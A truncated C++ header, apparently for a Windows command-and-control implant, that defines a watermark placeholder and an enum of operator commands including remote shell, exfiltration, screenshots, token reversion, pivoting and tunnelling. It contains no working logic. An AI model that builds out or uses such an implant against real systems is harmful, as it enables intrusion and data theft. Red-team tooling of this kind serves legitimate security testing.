#pragma once

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <stdint.h>

#include <string>
#include <utility>
#include <vector>

namespace gopher_proto {

static const uint32_t WATERMARK = 0x__WATERMARK__;

enum CommandCode {
    COMMAND_ERROR = 0,
    COMMAND_PWD = 1,
    COMMAND_CD = 2,
    COMMAND_SHELL = 3,
    COMMAND_EXIT = 4,
    COMMAND_DOWNLOAD = 5,
    COMMAND_UPLOAD = 6,
    COMMAND_CAT = 7,
    COMMAND_CP = 8,
    COMMAND_MV = 9,
    COMMAND_MKDIR = 10,
    COMMAND_RM = 11,
    COMMAND_LS = 12,
    COMMAND_PS = 13,
    COMMAND_KILL = 14,
    COMMAND_ZIP = 15,
    COMMAND_SCREENSHOT = 16,
    COMMAND_RUN = 17,
    COMMAND_JOB_LIST = 18,
    COMMAND_JOB_KILL = 19,
    COMMAND_REV2SELF = 20,
    COMMAND_DISKS = 21,
    COMMAND_EXFIL = 22,
    COMMAND_GETUID = 23,
    COMMAND_LINK = 24,
    COMMAND_PROFILE = 25,
    COMMAND_SLEEP = 26,
    COMMAND_BURST = 27,
    COMMAND_TERMINATE = 28,
    COMMAND_UNLINK = 29,
    COMMAND_PIVOT_EXEC = 30,
    COMMAND_TUNNEL_START = 31,
    COMMAND_TUNNEL_STOP = 32,
